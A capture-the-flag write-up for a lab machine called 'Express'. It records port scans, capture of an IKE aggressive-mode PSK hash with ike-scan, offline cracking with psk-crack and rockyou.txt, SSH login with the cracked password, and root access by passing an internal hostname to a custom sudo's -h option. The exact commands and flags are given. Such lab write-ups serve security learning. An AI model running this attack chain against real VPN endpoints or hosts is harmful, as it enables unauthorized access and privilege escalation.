---
layout: post
title: "Express"
date: 2025-09-23
---

## Challenge Description
This was a cool Machine to pwn.

## Solution
As always lets start by gathering some information.

```
nmap 10.10.11.87

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 10:43 CEST
Nmap scan report for 10.10.11.87
Host is up (0.080s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

From the `nmap` output it seems to be only a ssh service on port `22`. I tried running some bruteforce on user/password with `hydra` to try accessing via ssh but it didn't worked. So I tried to take a better look at other ports with nmap:

```
sudo nmap -sU -T4 -F 10.10.11.87

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 11:37 CEST
Warning: 10.10.11.87 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.87
Host is up (0.032s latency).
Not shown: 82 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
139/udp   open|filtered netbios-ssn
500/udp   open          isakmp
518/udp   open|filtered ntalk
520/udp   open|filtered route
996/udp   open|filtered vsinet
1028/udp  open|filtered ms-lsa
1030/udp  open|filtered iad1
1900/udp  open|filtered upnp
4444/udp  open|filtered krb524
4500/udp  open|filtered nat-t-ike
20031/udp open|filtered bakbonenetvault
32768/udp open|filtered omad
49185/udp open|filtered unknown
49186/udp open|filtered unknown
49188/udp open|filtered unknown
49191/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 89.18 seconds
```

Nice! I knew there was something else! I found a service running on UDP port 500. We can see that its running ISAKMP (Internet Security Association and Key Management Protocol) that its a protocol defined in the RFC 2408, that provides a generic framework for the creation of Security Association (SA) and cryptographic key exchange. Its often been used with the IKE (Internet Key Exchange) protocol.

Since it is used in the Internet Key Exchange lets take a look at the ike-scan tool, maybe we are able to retrive some more juice information.

```
ike-scan 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=9ff79c02d57d9e42) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.038 seconds (26.31 hosts/sec).  1 returned handshake; 0 returned notify
```

Nice we managed to retrive some good information, now lets run it again but this time I will use `-A` to enter `Aggressive mode` in order to be able to retrive more information and `-M` to have a better output for later.

```
ike-scan -A -M --pskcrack=psk_hash.txt 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=12255a5f0d91beb2)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.037 seconds (27.34 hosts/sec).  1 returned handshake; 0 returned notify
```

Once saved the hash inside the file `psk_hash.txt`, we can try to crack it by using a dictionaries like `rockyou.txt`.

```
psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.txt

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash f287aab0d37b7a002b0ed2903e8edd07cd0161c6
Ending psk-crack: 8045040 iterations in 4.102 seconds (1961082.76 iterations/sec)
```

Nice we have a valid username and a password! Lets try to connect via ssh.

`ike/freakingrockstarontheroad`

```
ike@expressway:~$ cat user.txt 

42ae24979f6104cc2e0bff5ae9d5d4ed
```

Now lets try to get the root flag.

```
ike@expressway:~$ sudo -i
ike is not allowed to run sudo on expressway.

ike@expressway:/$ which sudo
/usr/local/bin/sudo
```

From this path we can deduce that its not the classical sudo. The `id` command showed us that we have a `proxy` group, lets look at what file we can access with it.

```
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

ike@expressway:~$ find / -group proxy -type f 2>/dev/null
/var/spool/squid/netdb.state
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

```
ike@expressway:/$ zcat /var/log/squid/cache.log.2.gz
2025/07/22 19:32:30 kid1| Set Current Directory to /var/spool/squid
2025/07/22 19:32:30 kid1| Creating missing swap directories
2025/07/22 19:32:30 kid1| No cache_dir stores are configured.
2025/07/22 19:32:30| Removing PID file (/run/squid.pid)
2025/07/22 19:32:30 kid1| Set Current Directory to /var/spool/squid
2025/07/22 19:32:30 kid1| Starting Squid Cache version 5.7 for x86_64-pc-linux-gnu...
2025/07/22 19:32:30 kid1| Service Name: squid
2025/07/22 19:32:30 kid1| Process ID 605
2025/07/22 19:32:30 kid1| Process Roles: worker
2025/07/22 19:32:30 kid1| With 1024 file descriptors available
2025/07/22 19:32:30 kid1| Initializing IP Cache...
2025/07/22 19:32:30 kid1| DNS Socket created at [::], FD 8
2025/07/22 19:32:30 kid1| DNS Socket created at 0.0.0.0, FD 9
2025/07/22 19:32:30 kid1| Adding nameserver 208.67.222.222 from /etc/resolv.conf
2025/07/22 19:32:30 kid1| Adding nameserver 1.1.1.1 from /etc/resolv.conf
2025/07/22 19:32:30 kid1| Logfile: opening log daemon:/var/log/squid/access.log
2025/07/22 19:32:30 kid1| Logfile Daemon: opening log /var/log/squid/access.log
2025/07/22 19:32:30 kid1| Local cache digest enabled; rebuild/rewrite every 3600/3600 sec
2025/07/22 19:32:30 kid1| Store logging disabled
2025/07/22 19:32:30 kid1| Swap maxSize 0 + 262144 KB, estimated 20164 objects
2025/07/22 19:32:30 kid1| Target number of buckets: 1008
2025/07/22 19:32:30 kid1| Using 8192 Store buckets
2025/07/22 19:32:30 kid1| Max Mem  size: 262144 KB
2025/07/22 19:32:30 kid1| Max Swap size: 0 KB
2025/07/22 19:32:30 kid1| Using Least Load store dir selection
2025/07/22 19:32:30 kid1| Set Current Directory to /var/spool/squid
2025/07/22 19:32:30 kid1| Finished loading MIME types and icons.
2025/07/22 19:32:30 kid1| HTCP Disabled.
2025/07/22 19:32:30 kid1| Pinger socket opened on FD 14
2025/07/22 19:32:30 kid1| Squid plugin modules loaded: 0
2025/07/22 19:32:30 kid1| Adaptation support is off.
2025/07/22 19:32:30 kid1| Accepting HTTP Socket connections at conn3 local=[::]:3128 remote=[::] FD 12 flags=9
2025/07/22 19:32:30| pinger: Initialising ICMP pinger ...
2025/07/22 19:32:30| pinger: ICMP socket opened.
2025/07/22 19:32:30| pinger: ICMPv6 socket opened
2025/07/22 19:32:31 kid1| storeLateRelease: released 0 objects
2025/07/22 20:17:55 kid1| Logfile: opening log stdio:/var/spool/squid/netdb.state
2025/07/22 20:17:55 kid1| Logfile: closing log stdio:/var/spool/squid/netdb.state
2025/07/22 20:17:55 kid1| NETDB state saved; 0 entries, 0 msec
2025/07/22 21:36:41 kid1| Logfile: opening log stdio:/var/spool/squid/netdb.state
2025/07/22 21:36:41 kid1| Logfile: closing log stdio:/var/spool/squid/netdb.state
2025/07/22 21:36:41 kid1| NETDB state saved; 0 entries, 0 msec
2025/07/22 22:48:36 kid1| Logfile: opening log stdio:/var/spool/squid/netdb.state
2025/07/22 22:48:36 kid1| Logfile: closing log stdio:/var/spool/squid/netdb.state
2025/07/22 22:48:36 kid1| NETDB state saved; 0 entries, 0 msec
2025/07/22 23:48:06 kid1| Logfile: opening log stdio:/var/spool/squid/netdb.state
2025/07/22 23:48:06 kid1| Logfile: closing log stdio:/var/spool/squid/netdb.state
2025/07/22 23:48:06 kid1| NETDB state saved; 0 entries, 0 msec
2025/07/23 00:00:13 kid1| Closing Pinger socket on FD 14
2025/07/23 00:00:23| Pinger exiting.
2025/07/23 01:47:19| Removing PID file (/run/squid.pid)
```

```
ike@expressway:/$ cat /var/log/squid/access.log.1
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```

```
ike@expressway:/$ cat /var/log/squid/cache.log.1
2025/07/23 00:00:13 kid1| storeDirWriteCleanLogs: Starting...
2025/07/23 00:00:13 kid1|   Finished.  Wrote 0 entries.
2025/07/23 00:00:13 kid1|   Took 0.00 seconds (  0.00 entries/sec).
2025/07/23 00:00:13 kid1| logfileRotate: daemon:/var/log/squid/access.log
2025/07/23 00:00:13 kid1| logfileRotate: daemon:/var/log/squid/access.log
2025/07/23 00:00:13 kid1| Pinger socket opened on FD 13
2025/07/23 00:00:13| pinger: Initialising ICMP pinger ...
2025/07/23 00:00:13| pinger: ICMP socket opened.
2025/07/23 00:00:13| pinger: ICMPv6 socket opened
2025/07/23 00:51:20 kid1| Logfile: opening log stdio:/var/spool/squid/netdb.state
2025/07/23 00:51:20 kid1| Logfile: closing log stdio:/var/spool/squid/netdb.state
2025/07/23 00:51:20 kid1| NETDB state saved; 0 entries, 0 msec
2025/07/23 01:46:47 kid1| Preparing for shutdown after 1374 requests
2025/07/23 01:46:47 kid1| Waiting 30 seconds for active connections to finish
2025/07/23 01:46:47 kid1| Closing HTTP(S) port [::]:3128
2025/07/23 01:46:47 kid1| Closing Pinger socket on FD 13
2025/07/23 01:46:58| Pinger exiting.
2025/07/23 01:47:02 kid1| Logfile: opening log stdio:/var/spool/squid/netdb.state
2025/07/23 01:47:02 kid1| Logfile: closing log stdio:/var/spool/squid/netdb.state
2025/07/23 01:47:02 kid1| NETDB state saved; 0 entries, 0 msec
2025/07/23 01:47:18 kid1| Shutdown: NTLM authentication.
2025/07/23 01:47:18 kid1| Shutdown: Negotiate authentication.
2025/07/23 01:47:18 kid1| Shutdown: Digest authentication.
2025/07/23 01:47:18 kid1| Shutdown: Basic authentication.
2025/07/23 01:47:19 kid1| Shutting down...
2025/07/23 01:47:19 kid1| storeDirWriteCleanLogs: Starting...
2025/07/23 01:47:19 kid1|   Finished.  Wrote 0 entries.
2025/07/23 01:47:19 kid1|   Took 0.00 seconds (  0.00 entries/sec).
CPU Usage: 1.501 seconds = 0.898 user + 0.603 sys
Maximum Resident Size: 103200 KB
Page faults with physical i/o: 16
2025/07/23 01:47:19 kid1| Logfile: closing log daemon:/var/log/squid/access.log
2025/07/23 01:47:19 kid1| Logfile Daemon: closing log daemon:/var/log/squid/access.log
2025/07/23 01:47:19 kid1| Open FD UNSTARTED    10 IPC UNIX STREAM Parent
2025/07/23 01:47:19 kid1| Squid Cache (Version 5.7): Exiting normally.
```

From these files we can deduce the following:

`1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html`

There is another internal hostname under `offramp.expressway.htb` and we know from before that there is a custom `sudo` at `/usr/local/bin/sudo`. At this point lets try to use both information to run the custom `sudo` and identify ourself as `offramp.expressway.htb`.

```
ike@expressway:/$ /usr/local/bin/sudo -h offramp.expressway.htb id
uid=0(root) gid=0(root) groups=0(root)
```

It works! We are able to execute sudo commands!

```
ike@expressway:/$ /usr/local/bin/sudo -h offramp.expressway.htb ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old

ike@expressway:/$ /usr/local/bin/sudo -h offramp.expressway.htb cat /root/root.txt
a48ebf1067a82ee05727320281995f91
```